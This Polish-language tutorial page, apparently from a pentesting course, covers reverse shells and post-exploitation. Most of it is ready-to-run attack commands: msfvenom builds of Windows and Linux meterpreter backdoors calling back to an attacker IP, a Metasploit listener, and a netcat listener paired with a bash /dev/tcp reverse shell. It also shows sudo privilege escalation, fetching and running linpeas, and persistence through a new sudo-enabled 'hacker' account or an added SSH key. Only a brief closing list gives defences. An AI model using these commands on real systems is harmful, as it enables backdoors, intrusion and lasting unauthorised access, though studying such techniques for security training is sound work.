---
id: "reverse-shell-post-exploitation"
title: "🎭 Reverse Shell i Post-Exploitation"
sidebar_position: 14
---

# 🎭 Reverse Shell i Post-Exploitation

Po udanym przejęciu systemu atakujący może chcieć utrzymać dostęp, przechwycić dane, wykonać dalsze eskalacje uprawnień lub zainstalować backdoora. W tej sekcji omówimy, jak tworzyć **reverse shell**, przejmować sesje oraz utrwalać dostęp do systemu.

---

## 🛠️ Tworzenie backdoora
Backdoor to ukryte wejście do systemu, które pozwala atakującemu na ponowne zalogowanie się bez wiedzy administratora.

### **1️⃣ Tworzenie backdoora w Metasploit**
Metasploit umożliwia generowanie złośliwych plików wykonywalnych:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```
Jeśli atakowany system to Linux:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > backdoor.elf
```

#### **Uruchomienie backdoora**
Na maszynie atakującego uruchamiamy listener w Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```
Po otwarciu pliku `backdoor.exe` przez ofiarę, uzyskujemy zdalny dostęp do systemu.

---

## 🔄 Przechwytywanie sesji
Reverse Shell pozwala na pełną interakcję z systemem ofiary.

### **2️⃣ Uzyskanie Reverse Shell przez Netcat**
Atakujący otwiera listener:
```bash
nc -lvnp 4444
```
Ofiara uruchamia payload:
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
Po uruchomieniu polecenia, atakujący uzyskuje interaktywną powłokę.

### **3️⃣ Eskalacja uprawnień**
Po uzyskaniu dostępu do systemu można spróbować podnieść uprawnienia:
```bash
sudo -l
```
Jeśli istnieje dostęp do `sudo` bez hasła, można wykonać:
```bash
sudo /bin/bash
```
W przypadku Linuksa można użyć narzędzia `linpeas` do wykrycia potencjalnych wektorów eskalacji:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### **4️⃣ Utrwalanie dostępu**
Po uzyskaniu dostępu atakujący może dodać konto użytkownika:
```bash
sudo useradd -m -s /bin/bash hacker
sudo passwd hacker
sudo usermod -aG sudo hacker
```
Lub dodać klucz SSH do `~/.ssh/authorized_keys`, aby uzyskać trwały dostęp.

---

## 🔐 Jak zabezpieczyć system przed backdoorami i reverse shell?
✅ **Monitorowanie aktywności sieciowej i nietypowego ruchu na nietypowych portach**
✅ **Blokowanie Netcata i innych narzędzi używanych w atakach**
✅ **Używanie EDR (Endpoint Detection & Response) do wykrywania podejrzanych działań**
✅ **Regularne skanowanie systemów pod kątem nowych użytkowników i kluczy SSH**
✅ **Ograniczenie uprawnień i segmentacja sieci**

---

Reverse Shell i Post-Exploitation to kluczowe elementy zaawansowanego pentestingu. Kolejnym krokiem będzie **Ataki na uwierzytelnianie wieloskładnikowe (2FA Bypass)**! 🚀
